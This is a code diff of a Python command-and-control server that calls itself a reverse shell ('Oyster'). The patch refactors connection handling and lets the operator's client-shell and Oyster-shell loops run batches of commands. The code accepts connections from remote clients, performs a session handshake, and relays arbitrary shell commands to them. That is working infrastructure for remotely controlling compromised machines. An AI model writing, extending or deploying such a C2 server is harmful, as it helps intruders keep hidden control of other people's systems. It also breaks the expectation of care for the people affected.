@@ -1,8 +1,8 @@
 from __future__ import print_function
 import sys
+from time import sleep
 import threading
 import socket
-from time import sleep
 import os
 from os import execv
 from common import PluginRunner
@@ -10,7 +10,7 @@ from common import safe_input
 from common import LoopReturnEvent
 from common import LoopContinueEvent
 from common import LoopBreakEvent
-from connection import Connection
+from connection import HeaderServer, TerminatingServer
 from connection import ConnectionManager
 
 
@@ -51,7 +51,7 @@ class Server(PluginRunner):
     """
     A simple command and control server(Reverse Shell).
     """
-    def __init__(self, host="", port=6667, recv_size=1024, listen=10, bind_retry=5, header=True):
+    def __init__(self, connection_type, host="", port=6667, recv_size=1024, listen=10, bind_retry=5, header=True):
         self.header = header
         header = """\n .oOOOo.
 .O     o.
@@ -81,23 +81,9 @@ o       O o   O `Ooo.   O   OooO'  o
         self.shell_plugins = []
         self.outgoing_plugins = []
 
-        self.connection_mgr = ConnectionManager()
+        self.connection_mgr = ConnectionManager(connection_type)
         self.create_socket()
         self.bind_socket()
-
-    def send_command(self, data, echo=False, encode=True, file_response=False):
-        """
-        Shortcut to send a command to the currently connected client in the connection manager.
-
-        :param data:
-        :param echo:
-        :param encode:
-        :param file_response:
-        :return:
-        """
-
-        response = self.connection_mgr.send_command(data, echo=echo, encode=encode, file_response=file_response)
-        return response
 
     def create_socket(self):
         """
@@ -108,11 +94,12 @@ o       O o   O `Ooo.   O   OooO'  o
 
         try:
             self.socket = socket.socket()
+            self.socket.setblocking(True)
         except socket.error as error_message:
             print('< Could not create socket:', error_message, '>')
             sys.exit()
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        return self
+        return self.socket
 
     def bind_socket(self, attempts=1):
         """
@@ -139,6 +126,20 @@ o       O o   O `Ooo.   O   OooO'  o
             self.bind_socket(attempts=attempts + 1)
         return self
 
+    def send_command(self, data, echo=False, encode=True, file_response=False):
+        """
+        Shortcut to send a command to the currently connected client in the connection manager.
+
+        :param data:
+        :param echo:
+        :param encode:
+        :param file_response:
+        :return:
+        """
+
+        response = self.connection_mgr.send_command(data, echo=echo, encode=encode, file_response=file_response)
+        return response
+
     def listener(self, shutdown_event):
         """
         Start listening for connections.
@@ -157,7 +158,7 @@ o       O o   O `Ooo.   O   OooO'  o
             if address[0] in self.connection_mgr.connections.keys():
                 continue
 
-            conn_obj = Connection(conn, address, recv_size=self.recv_size)
+            conn_obj = self.connection_mgr.connection_type(conn, address, recv_size=self.recv_size)
             should_connect = conn_obj.send_command('oyster handshake {}'.format(self.connection_mgr.session_id))
             should_connect = True if should_connect == 'True' else False
             if should_connect:
@@ -253,7 +254,7 @@ o       O o   O `Ooo.   O   OooO'  o
 
         return plugin_list
 
-    def start_client_shell(self):
+    def start_client_shell(self, commands=None):
         """
         Open up a client shell using the current connection.
 
@@ -261,69 +262,122 @@ o       O o   O `Ooo.   O   OooO'  o
         """
 
         self.outgoing_plugins = self.outgoing_plugins if self.outgoing_plugins else self.get_outgoing_plugins()
-        self.connection_mgr.send_command('oyster getcwd')
+        self.connection_mgr.cwd = self.connection_mgr.send_command('oyster getcwd')
         while True:
             if self.connection_mgr.current_connection is None:
                 return
 
             # Get the client IP to display in the input string along with the current working directory
-            input_string = "<{}> {}".format(self.connection_mgr.send_command('oyster get-ip'), self.connection_mgr.cwd)
+            self.connection_mgr.cwd = self.connection_mgr.send_command('oyster getcwd')
+            ip = self.connection_mgr.send_command('oyster get-ip')
+            input_string = "<{}> {}".format(
+                ip,
+                self.connection_mgr.cwd
+            )
             if self.connection_mgr.current_connection is None:
                 return
             # If the connection was closed for some reason, return which will end the client shell.
             if self.connection_mgr.current_connection.status == 'CLOSED':
                 return
 
-            # Get a command from the user using the crafted input string.
-            command = safe_input(input_string)
-
-            # # # # # # # PROCESS PLUGINS # # # # # # #
-            plugin_ran, obj = self.process_plugins(self.outgoing_plugins, command, help_mode_on=self.help_mode)
-            if plugin_ran:
-                if isinstance(obj, LoopBreakEvent):
-                    break
-
-                if isinstance(obj, LoopContinueEvent):
+            if not commands:
+                # Get a command from the user using the crafted input string.
+                command = safe_input(input_string)
+                if command == '':
                     continue
 
-                if isinstance(obj, LoopReturnEvent):
-                    return obj.value
+                    # # # # # # # PROCESS PLUGINS # # # # # # #
+                plugin_ran, obj = self.process_plugins(self.outgoing_plugins, command, help_mode_on=self.help_mode)
+                if plugin_ran:
+                    if isinstance(obj, LoopBreakEvent):
+                        break
+                    if isinstance(obj, LoopContinueEvent):
+                        continue
+                    if isinstance(obj, LoopReturnEvent):
+                        return obj.value
+                    continue
+            else:
+                breaks = False
+                continues = False
+                returns = False
+                for command in commands:
+                    plugin_ran, obj = self.process_plugins(self.outgoing_plugins, command, help_mode_on=self.help_mode)
+                    if plugin_ran:
+                        if isinstance(obj, LoopBreakEvent):
+                            breaks = True
+                        if isinstance(obj, LoopContinueEvent):
+                            continues = True
+                        if isinstance(obj, LoopReturnEvent):
+                            returns = True, obj.value
+                        continues = True
 
-                continue
+                if returns:
+                    return returns[1]
+                if breaks:
+                    break
+                if continues:
+                    continue
 
             # Send command through.
             try:
-                response = self.connection_mgr.send_command(command)
+                if not commands:
+                    response = self.connection_mgr.send_command(command)
+                else:
+                    for command in commands:
+                        print(self.connection_mgr.send_command(command), end='')
+                    commands = None
+                    continue
             except BrokenPipeError as err_msg:
-                print(err_msg)
+                print('ERROR:', err_msg)
                 break
+
             print(response, end='')
         return
 
-    def open_oyster(self):
+    def open_oyster(self, commands=None):
         """
         Run the Oyster shell.
 
+        :param commands:
         :return:
         """
 
         self.shell_plugins = self.shell_plugins if self.shell_plugins else self.get_shell_plugins()
         while True:
-            command = safe_input('\rOyster> ')
-
-            # # # # # # # PROCESS PLUGINS # # # # # # #
-            plugin_ran, obj = self.process_plugins(self.shell_plugins, command, help_mode_on=self.help_mode)
-            if plugin_ran:
-                if isinstance(obj, LoopBreakEvent):
-                    break
-
-                if isinstance(obj, LoopContinueEvent):
+            if not commands:
+                command = safe_input('\rOyster> ')
+                # # # # # # # PROCESS PLUGINS # # # # # # #
+                plugin_ran, obj = self.process_plugins(self.shell_plugins, command, help_mode_on=self.help_mode)
+                if plugin_ran:
+                    if isinstance(obj, LoopBreakEvent):
+                        break
+                    if isinstance(obj, LoopContinueEvent):
+                        continue
+                    if isinstance(obj, LoopReturnEvent):
+                        return obj.value
                     continue
+            else:
+                breaks = False
+                continues = False
+                returns = False
+                for command in commands:
+                    plugin_ran, obj = self.process_plugins(self.shell_plugins, command, help_mode_on=self.help_mode)
+                    if plugin_ran:
+                        if isinstance(obj, LoopBreakEvent):
+                            breaks = True
+                        if isinstance(obj, LoopContinueEvent):
+                            continues = True
+                        if isinstance(obj, LoopReturnEvent):
+                            returns = True, obj.value
+                        continues = True
 
-                if isinstance(obj, LoopReturnEvent):
-                    return obj.value
-
-                continue
+                commands = None
+                if returns:
+                    return returns[1]
+                if breaks:
+                    break
+                if continues:
+                    continue
         return
 
     def reboot_self(self):
@@ -361,6 +415,7 @@ if __name__ == '__main__':
         arg_dict = get_arg_dict(args)
 
         server = Server(
+            HeaderServer,
             host=arg_dict['host'],
             port=arg_dict['port'],
             recv_size=arg_dict['recv_size'],
